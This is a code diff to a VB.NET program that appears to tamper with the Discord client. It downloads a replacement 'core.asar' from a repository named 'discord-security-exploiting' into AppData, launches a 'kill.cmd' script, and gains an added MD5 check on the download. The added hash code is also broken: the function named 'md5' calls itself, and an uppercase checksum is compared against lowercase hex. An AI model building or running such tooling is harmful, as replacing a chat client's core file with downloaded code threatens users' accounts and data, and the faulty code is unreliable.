@@ -1,12 +1,14 @@
-﻿Imports System.Deployment
+﻿
+Imports System.Deployment
 Imports System.Reflection
 Imports System.Threading
 Imports System.Net
 Imports System.IO
 Imports System.Drawing
-
+Imports System.Security.Cryptography
 
 Module Module1
+    Dim checksum As String = "D326E28F9D968E9CA254A68D28D1D18A"
     Dim option_Step As Boolean
     Dim option_Debug As Boolean = False
     Dim option_SilentStep As Boolean = False
@@ -52,6 +54,26 @@ Module Module1
     End Sub
     Public Function EncodeBase64(input As String) As String
         Return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(input))
+    End Function
+
+    Function md5(ByVal file_name As String)
+        Dim hash = md5.Create()
+        Dim hashValue() As Byte
+        Dim fileStream As FileStream = File.OpenRead(file_name)
+        fileStream.Position = 0
+        hashValue = hash.ComputeHash(fileStream)
+        Dim hash_hex = PrintByteArray(hashValue)
+        fileStream.Close()
+        Return hash_hex
+    End Function
+
+    Public Function PrintByteArray(ByVal array() As Byte)
+        Dim hex_value As String = ""
+        Dim i As Integer
+        For i = 0 To array.Length - 1
+            hex_value += array(i).ToString("X2")
+        Next i
+        Return hex_value.ToLower
     End Function
     Sub checkLic()
         Dim correctKey As String = StringToBinary(Environment.UserName, "")
@@ -251,14 +273,20 @@ Module Module1
   Sub()
       My.Computer.Network.DownloadFile("https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/core.asar",
 appData & "\core.asar")
-      dlog("Downloading file from url : https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/core.asar - tp location : " + appData & "core.asar")
+      dlog("Downloading file from url : https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/core.asar - to location : " + appData & "core.asar")
       dlog("Waiting 5000 miliseconds so the download can compleate,")
       Threading.Thread.Sleep(8000)
+      Console.WriteLine(md5(appData & "\core.asar"))
+      Console.ReadLine()
+      If Not md5(appData & "\core.asar") = checksum Then
+          elog("Error : Unable to download file!")
+          errorHandler.ErrorHandler("0x1000", False)
+      End If
   End Sub
 )
-
         log("Starting thread...")
         thread.Start()
+
         log("Starting kill script...")
         dlog("Launching process cmd.exe with args /c " + appData & "\kill.cmd - which launches the killscript")
         Process.Start(appData & "\kill.cmd")
@@ -594,7 +622,7 @@ appData & "\core.asar")
                                                     If newArgs = "easterEgg" Then
 
                                                     Else
-                                                            elog("Invalid arguments! please try again.")
+                                                        elog("Invalid arguments! please try again.")
                                                         invalidArgs()
                                                     End If
                                                 End If
